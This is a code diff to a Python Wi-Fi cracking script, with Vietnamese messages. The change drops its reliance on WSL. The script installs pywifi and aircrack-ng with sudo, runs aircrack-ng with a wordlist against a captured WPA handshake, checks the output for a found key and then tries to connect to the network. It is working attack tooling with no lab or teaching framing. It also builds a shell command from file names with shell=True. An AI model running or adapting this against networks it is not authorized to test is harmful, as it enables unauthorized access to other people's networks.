@@ -8,7 +8,7 @@ try:
     from pywifi import const
 except ImportError:
     print("Đang cài đặt pywifi...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywifi"])
+    subprocess.check_call(["sudo", "python3", "-m", "pip", "install", "pywifi"])
     import pywifi
     from pywifi import const
 
@@ -49,19 +49,20 @@ def connect_to_wifi(ssid, password):
     return False
 
 if __name__ == "__main__":
-    # Kiểm tra và cài đặt aircrack-ng trong WSL
+    # Kiểm tra và cài đặt aircrack-ng
     try:
-        subprocess.check_output(["wsl", "aircrack-ng", "--help"])
+        subprocess.check_output(["aircrack-ng", "--help"])
     except FileNotFoundError:
-        print("WSL không được tìm thấy. Vui lòng cài đặt WSL trước khi chạy script.")
+        print("aircrack-ng chưa được tìm thấy. Vui lòng cài đặt aircrack-ng trước khi chạy script.")
         exit()
     except subprocess.CalledProcessError:
-        print("aircrack-ng chưa được cài đặt trong WSL. Đang cài đặt...")
-        subprocess.check_call(["wsl", "sudo", "apt", "update"])
-        subprocess.check_call(["wsl", "sudo", "apt", "install", "-y", "aircrack-ng"])
+        print("aircrack-ng chưa được cài đặt. Đang cài đặt...")
+        subprocess.check_call(["sudo", "apt", "update"])
+        subprocess.check_call(["sudo", "apt", "install", "-y", "aircrack-ng"])
 
     try:
-        command = f"wsl aircrack-ng -w {WORDLIST_FILE} -b {HANDSHAKE_FILE}"
+        # Bỏ "wsl" khỏi lệnh 
+        command = f"aircrack-ng -w {WORDLIST_FILE} -b {HANDSHAKE_FILE}" 
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
         if "KEY FOUND!" in stdout.decode():
